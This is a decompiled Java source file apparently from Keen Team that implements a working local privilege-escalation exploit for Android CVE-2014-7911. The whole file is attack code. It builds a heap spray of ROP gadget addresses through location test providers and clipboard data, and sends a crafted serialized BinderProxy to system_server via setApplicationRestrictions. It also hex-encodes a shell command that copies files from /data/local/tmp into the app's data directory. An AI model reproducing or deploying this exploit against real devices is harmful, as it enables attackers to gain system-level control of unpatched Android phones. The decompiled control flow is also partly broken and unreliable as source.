// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: braces fieldsfirst space lnc 

package org.keenteam;

import AAdroid.os.BinderProxy;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.os.RemoteException;
import android.os.UserHandle;
import android.os.UserManager;
import java.io.PrintStream;
import java.lang.reflect.Field;

// Referenced classes of package org.keenteam:
//            exploitHelper

public class exploit_CVE_2014_7911
{

    private static final String DESCRIPTOR = "android.os.IUserManager";
    private int TRANSACTION_setApplicationRestrictions;
    private String androidBrand;
    private String androidManufacturer;
    private String androidPlatform;
    private String androidVersion;
    private Class clProxy;
    private Class clStub;
    private ClipboardManager cm;
    private int dalvikAddr;
    private int gadget1;
    private int gadget2;
    private int gadget3;
    private LocationManager lm;
    private IBinder mRemote;
    private String payload;
    private int sprayRefAddr;
    private int systemAddr;

    public exploit_CVE_2014_7911()
    {
    }

    private void do_collect()
    {
        int i = 0;
_L3:
        if (i < 8182) goto _L2; else goto _L1
_L1:
        ClipData clipdata;
        int j;
        clipdata = ClipData.newPlainText("A1000", payload);
        j = 1;
_L4:
        if (j >= 60)
        {
            cm.setPrimaryClip(clipdata);
            cm.setPrimaryClip(clipdata);
            cm.setPrimaryClip(clipdata);
            do
            {
                try
                {
                    Thread.sleep(1000L);
                }
                catch (Exception exception) { }
                cm.setPrimaryClip(clipdata);
            } while (true);
        }
        break MISSING_BLOCK_LABEL_100;
_L2:
        payload = (new StringBuilder(String.valueOf(payload))).append("B").toString();
        i++;
          goto _L3
        clipdata.addItem(new android.content.ClipData.Item(payload));
        j++;
          goto _L4
    }

    private void do_spray()
    {
        String s;
        String s1;
        int i;
        s = "";
        s1 = (new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf(""))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(-8 + (-108 + (160 + sprayRefAddr))))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(160 + sprayRefAddr))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(gadget2))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(gadget3))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(gadget1))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xf0f0f0f0))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(systemAddr))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x2f207063))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x61746164))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x636f6c2f))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x742f6c61))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x612f706d))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x61642f20))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x612f6174))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6c2d7070))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6f2f6269))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6b2e6772))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x746e6565))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x2d6d6165))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x633b2f31))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x642f2070))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x2f617461))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x61636f6c))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6d742f6c))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x616d2f70))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x2f206e69))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x61746164))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x7070612f))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x62696c2d))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x67726f2f))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x65656b2e))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6165746e))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x2f312d6d))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x61642f3b))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x612f6174))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6c2d7070))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6f2f6269))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x6b2e6772))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x746e6565))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x2d6d6165))).toString()))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0x612f31))).toString();
        i = 0;
_L5:
        if (i < 8063) goto _L2; else goto _L1
_L1:
        String s2;
        int j;
        s2 = (new StringBuilder(String.valueOf((new StringBuilder(String.valueOf(s))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(1))).toString()))).append(s1).toString();
        j = 0;
_L6:
        if (j < 61) goto _L4; else goto _L3
_L3:
        int k = 0;
_L7:
        if (k >= 1536)
        {
            return;
        }
        break MISSING_BLOCK_LABEL_1646;
_L2:
        s = (new StringBuilder(String.valueOf(s))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString((32416 + sprayRefAddr) - i * 4))).toString();
        i++;
          goto _L5
_L4:
        s2 = (new StringBuilder(String.valueOf(s2))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(0xbbadbeef))).toString();
        j++;
          goto _L6
        lm.addTestProvider((new StringBuilder(String.valueOf(s2))).append(exploitHelper.unescape(exploitHelper.intToUnescapeString(k))).toString(), false, false, false, false, false, false, false, 1, 1);
        k++;
          goto _L7
    }

    public void do_exploit(Context context)
    {
        exploitHelper exploithelper = new exploitHelper();
        systemAddr = exploithelper.getSystemAddr();
        dalvikAddr = exploithelper.getDalvikHeapAddr();
        androidVersion = exploithelper.getAndroidVersion();
        androidBrand = exploithelper.getBrand();
        androidManufacturer = exploithelper.getManufacturer();
        androidPlatform = exploithelper.getPlatform();
        gadget1 = exploithelper.getGadget1();
        gadget2 = exploithelper.getGadget2();
        gadget3 = exploithelper.getGadget3();
        sprayRefAddr = 0x3000000 + dalvikAddr;
        Bundle bundle = new Bundle();
        if (!androidVersion.startsWith("4.4")) goto _L2; else goto _L1
_L1:
        Object obj;
        obj = new BinderProxy();
        ((BinderProxy)obj).mObject = 160 + sprayRefAddr;
        ((BinderProxy)obj).mOrgue = 160 + sprayRefAddr;
_L7:
        Class aclass[];
        bundle.putSerializable("eatthis", ((java.io.Serializable) (obj)));
        aclass = Class.forName("android.os.IUserManager").getDeclaredClasses();
        System.out.println((new StringBuilder(String.valueOf(aclass.length))).append(" inner classes found").toString());
        Class class1;
        int j;
        Class aclass1[];
        int l;
        class1 = null;
        int i;
        Field field;
        UserManager usermanager;
        Field field1;
        Object obj1;
        int k;
        Field field2;
        UserHandle userhandle;
        try
        {
            i = aclass.length;
        }
        catch (Exception exception)
        {
            RuntimeException runtimeexception = new RuntimeException(exception);
            throw runtimeexception;
        }
        j = 0;
_L9:
        if (j < i) goto _L4; else goto _L3
_L3:
        field = class1.getDeclaredField("TRANSACTION_setApplicationRestrictions");
        field.setAccessible(true);
        TRANSACTION_setApplicationRestrictions = field.getInt(null);
        usermanager = (UserManager)context.getSystemService("user");
        field1 = android/os/UserManager.getDeclaredField("mService");
        field1.setAccessible(true);
        obj1 = field1.get(usermanager);
        aclass1 = class1.getDeclaredClasses();
        System.out.println((new StringBuilder(String.valueOf(aclass1.length))).append(" inner classes found").toString());
        clProxy = null;
        k = aclass1.length;
        l = 0;
_L8:
        if (l < k) goto _L6; else goto _L5
_L5:
        field2 = clProxy.getDeclaredField("mRemote");
        field2.setAccessible(true);
        mRemote = (IBinder)field2.get(obj1);
        userhandle = Process.myUserHandle();
        setApplicationRestrictions(context, context.getPackageName(), bundle, userhandle.hashCode());
        return;
_L2:
        obj = new BBdroid.os.BinderProxy();
        ((BBdroid.os.BinderProxy)obj).mObject = 160 + sprayRefAddr;
        ((BBdroid.os.BinderProxy)obj).mOrgue = 160 + sprayRefAddr;
          goto _L7
_L4:
        Class class3 = aclass[j];
        if (class3.getCanonicalName().equals("android.os.IUserManager.Stub"))
        {
            class1 = class3;
        }
        break MISSING_BLOCK_LABEL_508;
_L6:
        Class class2 = aclass1[l];
        if (class2.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy"))
        {
            clProxy = class2;
        }
        l++;
          goto _L8
        j++;
          goto _L9
    }

    public void setApplicationRestrictions(Context context, String s, Bundle bundle, int i)
        throws RemoteException
    {
        Parcel parcel;
        Parcel parcel1;
        cm = (ClipboardManager)context.getSystemService("clipboard");
        lm = (LocationManager)context.getSystemService("location");
        parcel = Parcel.obtain();
        parcel1 = Parcel.obtain();
        byte abyte0[];
        parcel.writeInterfaceToken("android.os.IUserManager");
        parcel.writeString(s);
        parcel.writeInt(1);
        bundle.writeToParcel(parcel, 0);
        parcel.writeInt(i);
        abyte0 = parcel.marshall();
        int j = 0;
_L3:
        if (abyte0[j] != 65 || abyte0[j + 1] != 65 || abyte0[j + 2] != 100 || abyte0[j + 3] != 114)
        {
            break MISSING_BLOCK_LABEL_207;
        }
        abyte0[j] = 97;
        abyte0[j + 1] = 110;
_L1:
        parcel.recycle();
        parcel = Parcel.obtain();
        parcel.unmarshall(abyte0, 0, abyte0.length);
        do_spray();
        mRemote.transact(TRANSACTION_setApplicationRestrictions, parcel, parcel1, 0);
        parcel1.readException();
        parcel1.recycle();
        parcel.recycle();
        do_collect();
        return;
        if (abyte0[j] != 66 || abyte0[j + 1] != 66 || abyte0[j + 2] != 100 || abyte0[j + 3] != 114)
        {
            break MISSING_BLOCK_LABEL_291;
        }
        abyte0[j] = 97;
        abyte0[j + 1] = 110;
          goto _L1
        Exception exception;
        exception;
        parcel1.recycle();
        parcel.recycle();
        do_collect();
        throw exception;
        j++;
        if (true) goto _L3; else goto _L2
_L2:
    }
}
